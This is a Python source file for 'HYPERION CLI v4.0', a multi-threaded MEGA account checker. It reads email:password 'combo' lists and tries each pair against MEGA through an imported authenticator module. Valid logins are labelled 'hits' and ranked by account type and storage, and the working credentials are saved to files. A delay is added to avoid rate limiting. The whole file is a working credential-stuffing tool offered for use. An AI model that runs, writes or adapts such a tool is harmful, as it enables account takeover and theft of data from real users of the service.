#!/usr/bin/env python3
"""
HYPERION CLI v4.0 - Command Line MEGA Account Checker
=====================================================

🎯 Features:
- MEGA account validation and checking
- Multi-threaded processing
- Real-time progress display  
- Detailed hit categorization
- Auto-save functionality
- Comprehensive reporting

Usage: python hyperion_checker_cli.py [combo_file] [options]
"""

import sys
import os
import time
import threading
from datetime import datetime
from pathlib import Path

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

class HyperionCLI:
    def __init__(self):
        self.stats = {
            'total': 0,
            'checked': 0, 
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'start_time': None,
            'rate': 0
        }
        
        self.hits = []
        self.running = False
        
    def load_combo_file(self, filepath):
        """Load and validate combo file"""
        try:
            print(f"📁 Loading combo file: {filepath}")
            
            if not os.path.exists(filepath):
                print(f"❌ File not found: {filepath}")
                return []
                
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
                
            combos = []
            for line in lines:
                if ':' in line and not line.startswith('#'):
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        email = parts[0].strip()
                        password = parts[1].strip()
                        if email and password:
                            combos.append((email, password))
                            
            print(f"✅ Loaded {len(combos)} valid combos from {len(lines)} lines")
            return combos
            
        except Exception as e:
            print(f"❌ Error loading combo file: {e}")
            return []
    
    def check_single_account(self, email, password):
        """Check a single MEGA account"""
        try:
            from mega_auth import MegaAuthenticator
            
            auth = MegaAuthenticator()
            success, account_data, error = auth.login(email, password)
            
            if success:
                # Successful login
                account_type = "Unknown"
                storage_used = "Unknown"
                storage_total = "Unknown"
                
                if account_data:
                    storage_used = f"{account_data.get('used_space', 0):.2f} GB"
                    storage_total = f"{account_data.get('total_space', 0):.2f} GB"
                    
                    # Determine account type
                    used = account_data.get('used_space', 0)
                    total = account_data.get('total_space', 0)
                    files = account_data.get('file_count', 0)
                    
                    if total > 50:  # More than 50GB usually indicates PRO
                        account_type = "PRO"
                    elif used > 0 or files > 0:
                        account_type = "FREE_USED"
                    else:
                        account_type = "FREE_EMPTY"
                
                result = {
                    'email': email,
                    'password': password,
                    'status': 'hit',
                    'account_type': account_type,
                    'storage_used': storage_used,
                    'storage_total': storage_total,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                
                self.hits.append(result)
                return result
                
            else:
                # Login failed
                return {
                    'email': email,
                    'password': password, 
                    'status': 'fail',
                    'error': error,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                
        except Exception as e:
            return {
                'email': email,
                'password': password,
                'status': 'error',
                'error': str(e),
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
    
    def update_stats(self, result):
        """Update checking statistics"""
        self.stats['checked'] += 1
        
        if result['status'] == 'hit':
            self.stats['hits'] += 1
        elif result['status'] == 'fail':
            self.stats['fails'] += 1
        else:
            self.stats['errors'] += 1
            
        # Calculate rate (checks per minute)
        if self.stats['start_time']:
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                self.stats['rate'] = (self.stats['checked'] * 60) / elapsed
    
    def display_progress(self):
        """Display real-time progress"""
        checked = self.stats['checked']
        total = self.stats['total']
        hits = self.stats['hits']
        fails = self.stats['fails']
        errors = self.stats['errors'] 
        rate = self.stats['rate']
        
        percentage = (checked / total * 100) if total > 0 else 0
        
        # Create progress bar
        bar_width = 30
        filled = int(bar_width * checked // total) if total > 0 else 0
        bar = '█' * filled + '░' * (bar_width - filled)
        
        # Clear line and print progress
        print(f"\r🚀 Progress: [{bar}] {percentage:5.1f}% | "
              f"✅ {checked:4d}/{total} | "
              f"🎯 Hits: {hits:3d} | "
              f"❌ Fails: {fails:3d} | "
              f"⚡ {rate:5.1f} CPM", end='', flush=True)
    
    def save_hits(self):
        """Save hits to files"""
        if not self.hits:
            return
            
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Create hits directory
            hits_dir = Path("hits_cli")
            hits_dir.mkdir(exist_ok=True)
            
            # Save all hits
            all_hits_file = hits_dir / f"all_hits_{timestamp}.txt"
            with open(all_hits_file, 'w', encoding='utf-8') as f:
                f.write(f"HYPERION CLI Results - {datetime.now()}\n")
                f.write("=" * 60 + "\n\n")
                
                for hit in self.hits:
                    f.write(f"Email: {hit['email']}\n")
                    f.write(f"Password: {hit['password']}\n")
                    f.write(f"Account Type: {hit['account_type']}\n")
                    f.write(f"Storage Used: {hit['storage_used']}\n")
                    f.write(f"Storage Total: {hit['storage_total']}\n")
                    f.write(f"Timestamp: {hit['timestamp']}\n")
                    f.write("-" * 40 + "\n")
            
            # Save combo format
            combo_file = hits_dir / f"hits_combo_{timestamp}.txt"
            with open(combo_file, 'w', encoding='utf-8') as f:
                for hit in self.hits:
                    f.write(f"{hit['email']}:{hit['password']}\n")
            
            print(f"\n💾 Hits saved to:")
            print(f"   📄 Details: {all_hits_file}")
            print(f"   📄 Combo: {combo_file}")
            
        except Exception as e:
            print(f"\n❌ Error saving hits: {e}")
    
    def check_combo_list(self, combos, threads=5):
        """Check list of combos with threading"""
        if not combos:
            print("❌ No combos to check")
            return
            
        self.stats['total'] = len(combos)
        self.stats['start_time'] = time.time()
        self.running = True
        
        print(f"\n🚀 Starting MEGA account checking...")
        print(f"📊 Total combos: {len(combos)}")
        print(f"🔧 Threads: {threads}")
        print(f"⏰ Started at: {datetime.now().strftime('%H:%M:%S')}")
        print()
        
        def worker():
            while self.running:
                try:
                    if not combos:
                        break
                        
                    email, password = combos.pop(0)
                    result = self.check_single_account(email, password)
                    self.update_stats(result)
                    
                    # Show hit immediately
                    if result['status'] == 'hit':
                        print(f"\n🎯 HIT: [{result['account_type']}] {email} | {result['storage_used']}")
                    
                    self.display_progress()
                    
                    # Small delay to avoid rate limiting
                    time.sleep(0.5)
                    
                except IndexError:
                    # No more combos
                    break
                except Exception as e:
                    print(f"\n❌ Worker error: {e}")
        
        # Start worker threads
        workers = []
        for i in range(min(threads, len(combos))):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            workers.append(t)
        
        # Wait for completion
        try:
            for t in workers:
                t.join()
        except KeyboardInterrupt:
            print("\n\n🛑 Stopping... (Ctrl+C pressed)")
            self.running = False
            
        print(f"\n\n✨ Checking completed!")
        
        # Display final results
        self.display_final_results()
        
        # Auto-save hits
        if self.hits:
            self.save_hits()
    
    def display_final_results(self):
        """Display final checking results"""
        print("\n" + "=" * 60)
        print("📊 FINAL RESULTS")
        print("=" * 60)
        
        print(f"📁 Total Processed: {self.stats['checked']}")
        print(f"🎯 Hits Found: {self.stats['hits']}")
        print(f"❌ Fails: {self.stats['fails']}")
        print(f"⚠️ Errors: {self.stats['errors']}")
        
        if self.stats['hits'] > 0:
            success_rate = (self.stats['hits'] / self.stats['checked'] * 100) if self.stats['checked'] > 0 else 0
            print(f"📈 Success Rate: {success_rate:.2f}%")
            
            # Categorize hits
            categories = {}
            for hit in self.hits:
                acc_type = hit['account_type']
                if acc_type not in categories:
                    categories[acc_type] = []
                categories[acc_type].append(hit)
            
            print(f"\n🏷️ Hit Categories:")
            for category, hits in categories.items():
                print(f"   {category}: {len(hits)} accounts")
        
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        print(f"⏱️ Total Time: {elapsed:.1f} seconds")
        print(f"⚡ Average Rate: {self.stats['rate']:.1f} checks/minute")

def main():
    """Main CLI entry point"""
    print("🎯 HYPERION CLI v4.0 - MEGA Account Checker")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print("Usage: python hyperion_checker_cli.py <combo_file> [threads]")
        print("\nExample:")
        print("  python hyperion_checker_cli.py combos.txt 10")
        return 1
    
    combo_file = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    
    # Initialize checker
    cli = HyperionCLI()
    
    # Load combos
    combos = cli.load_combo_file(combo_file)
    if not combos:
        return 1
    
    # Start checking
    try:
        cli.check_combo_list(combos, threads)
        print("\n🎉 HYPERION checking completed successfully!")
        return 0
    except Exception as e:
        print(f"\n💥 Fatal error: {e}")
        return 1

if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n\n🛑 Program interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n💥 Unexpected error: {e}")
        sys.exit(1)